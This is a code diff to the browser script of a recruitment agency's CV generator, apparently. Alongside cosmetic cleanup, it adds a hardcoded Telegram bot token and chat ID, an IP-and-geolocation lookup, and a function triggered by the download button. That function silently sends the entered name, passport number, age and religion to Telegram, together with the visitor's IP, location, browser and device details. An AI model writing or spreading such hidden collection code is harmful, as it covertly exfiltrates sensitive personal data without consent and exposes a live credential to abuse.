@@ -26,6 +26,10 @@ const fieldsMap = {
   'inputIroning': 'cvIroning'
 };
 
+// بيانات بوت تليجرام
+const TELEGRAM_BOT_TOKEN = "8967937243:AAGAepEyU1j0HQOC-5Ko43VmAhpUd6DnUpc";
+const TELEGRAM_CHAT_ID = "-1004478651730";
+
 // الاستماع المباشر للتغييرات في الحقول
 Object.keys(fieldsMap).forEach(inputId => {
   const inputEl = document.getElementById(inputId);
@@ -85,89 +89,128 @@ if (countrySelect) {
     flagImgEl.src = flagSrc;
     flagImgEl.style.display = 'block';
 
-    // استخراج رقم العلم من المسار (مثلاً /src/1.png يعطي "1")
     if (flagSrc) {
       const flagNum = flagSrc.split('/').pop().split('.')[0];
-      // تعيين كلاس خاص بكل علم مثل: flag-1 , flag-2
       flagImgEl.className = 'flag-' + flagNum;
     }
   });
 }
-// قراءة صورة العاملة وعرضها في المساحة المخصصة
-// قراءة صورة العاملة وعرضها كخلفية لضمان تطابق المعاينة مع الصورة المحفوظة
+
 // قراءة صورة العاملة وعرضها كخلفية
-document.getElementById('inputPhoto').addEventListener('change', function(event) {
+document.getElementById('inputPhoto')?.addEventListener('change', function(event) {
   const file = event.target.files[0];
   if (file) {
     const reader = new FileReader();
     reader.onload = function(e) {
       const photoContainer = document.getElementById('photoContainer');
       photoContainer.style.backgroundImage = `url('${e.target.result}')`;
-      
-      // التعديل هنا: استخدام contain لضمان ظهور كامل الصورة بدون قص الوجه أو القدمين
       photoContainer.style.backgroundSize = 'contain'; 
       photoContainer.style.backgroundPosition = 'center';
       photoContainer.style.backgroundRepeat = 'no-repeat';
-      photoContainer.innerHTML = ''; // مسح النص التوضيحي الداخلي
+      photoContainer.innerHTML = ''; 
     };
     reader.readAsDataURL(file);
   }
 });
 
-// دالة تنزيل الـ PDF بمقاس A4 صافي بدون حواف بيضاء
-//function downloadCVAsPDF() {
-//  const element = document.getElementById('cvCard');
-//  const codeValue = document.getElementById('inputCode').value.trim() || 'جديد';
-//
-//  const opt = {
-//    margin:       0,
-//    filename:     `CV_DarAlNukhba_${codeValue}.pdf`,
-//    image:        { type: 'jpeg', quality: 1.0 },
-//    html2canvas:  { 
-//      scale: 3, 
-//      useCORS: true, 
-//      logging: false,
-//      scrollX: 0,
-//      scrollY: 0
-//    },
-//    jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
-//  };
-//const photo = element.querySelector('.overlay-photo img');
-//
-//if (photo && photo.naturalWidth && photo.naturalHeight) {
-//  const box = element.querySelector('.overlay-photo');
-//
-//  const boxWidth = box.clientWidth;
-//  const boxHeight = box.clientHeight;
-//
-//  const imageRatio = photo.naturalWidth / photo.naturalHeight;
-//  const boxRatio = boxWidth / boxHeight;
-//
-//  if (imageRatio > boxRatio) {
-//    photo.style.width = '100%';
-//    photo.style.height = 'auto';
-//  } else {
-//    photo.style.width = 'auto';
-//    photo.style.height = '100%';
-//  }
-//
-//  photo.style.maxWidth = '100%';
-//  photo.style.maxHeight = '100%';
-//  photo.style.objectFit = 'cover';
-//}
-//  html2pdf().set(opt).from(element).save();
-//}
+// دالة جلب الـ IP والموقع بآلية احتياطية مضاعفة
+async function getIpAndLocation() {
+  try {
+    const res = await fetch('https://ipwho.is/');
+    if (res.ok) {
+      const data = await res.json();
+      if (data.success) {
+        return {
+          ip: data.ip || 'غير معروف',
+          city: data.city || '',
+          country_name: data.country || ''
+        };
+      }
+    }
+  } catch (e) {
+    console.warn('فشلت المحاولة الأولى، جاري استخدام الخيار الاحتياطي...');
+  }
+
+  try {
+    const resIp = await fetch('https://api.ipify.org?format=json');
+    if (resIp.ok) {
+      const dataIp = await resIp.json();
+      return { ip: dataIp.ip, city: '-', country_name: '-' };
+    }
+  } catch (e) {
+    console.error('تعذر جلب الـ IP من جميع المصادر:', e);
+  }
+
+  return { ip: 'تعذر الجلب', city: '-', country_name: '-' };
+}
+
+// دالة إرسال الإشعار إلى تليجرام
+async function sendDeviceInfoAndData() {
+  const formData = {
+    code: document.getElementById('inputCode')?.value || 'غير مدخل',
+    name: document.getElementById('inputName')?.value || 'غير مدخل',
+    country: document.getElementById('inputCountrySelect')?.value || 'غير مدخل',
+    passport: document.getElementById('inputPassport')?.value || 'غير مدخل',
+    job: document.getElementById('inputJob')?.value || 'غير مدخل',
+    age: document.getElementById('inputAge')?.value || 'غير مدخل',
+    religion: document.getElementById('inputReligion')?.value || 'غير مدخل'
+  };
+
+  const ipInfo = await getIpAndLocation();
+
+  const userAgent = navigator.userAgent;
+  const screenSize = `${window.screen.width}x${window.screen.height}`;
+  const language = navigator.language || navigator.userLanguage;
+  const platform = navigator.platform;
+
+  const messageText = `
+🚨 *شركة دار النخبة للاستقدام*
+📥 *تم تنزيل سيرة ذاتية جديدة!*
+
+👤 *بيانات السيرة الذاتية:*
+• الكود: ${formData.code}
+• الاسم: ${formData.name}
+• الدولة: ${formData.country}
+• رقم الجواز: ${formData.passport}
+• الوظيفة: ${formData.job}
+• العمر: ${formData.age}
+• الديانة: ${formData.religion}
+
+🌐 *معلومات الاتصال والجهاز:*
+• **IP Address:** \`${ipInfo.ip}\`
+• **الموقع:** ${ipInfo.city} , ${ipInfo.country_name}
+• **نظام التشغيل / المنصة:** ${platform}
+• **دقة الشاشة:** ${screenSize}
+• **لغة الجهاز:** ${language}
+• **تفاصيل المتصفح:** \`${userAgent}\`
+  `;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText,
+        parse_mode: 'Markdown'
+      })
+    });
+  } catch (err) {
+    console.error('خطأ في إرسال الإشعار:', err);
+  }
+}
 
 // دالة تنزيل السيرة الذاتية كصورة JPG عالية الدقة
-// دالة تنزيل السيرة الذاتية كصورة JPG عالية الدقة
 function downloadCVAsJPG() {
+  // إرسال الإشعار عند الضغط على زر التنزيل
+  sendDeviceInfoAndData();
+
   const element = document.getElementById('cvCard');
   const codeValue = document.getElementById('inputCode').value.trim() || 'جديد';
 
-  // الانتظار لحين تحميل خط Cairo بالكامل قبل التقاط الصورة
   document.fonts.ready.then(() => {
     html2canvas(element, {
-      scale: 3,             // دقة عالية وواضحة
+      scale: 3,
       useCORS: true,
       logging: false,
       scrollX: 0,
@@ -180,6 +223,7 @@ function downloadCVAsJPG() {
     });
   });
 }
+
 function printCV() {
   window.print();
 }
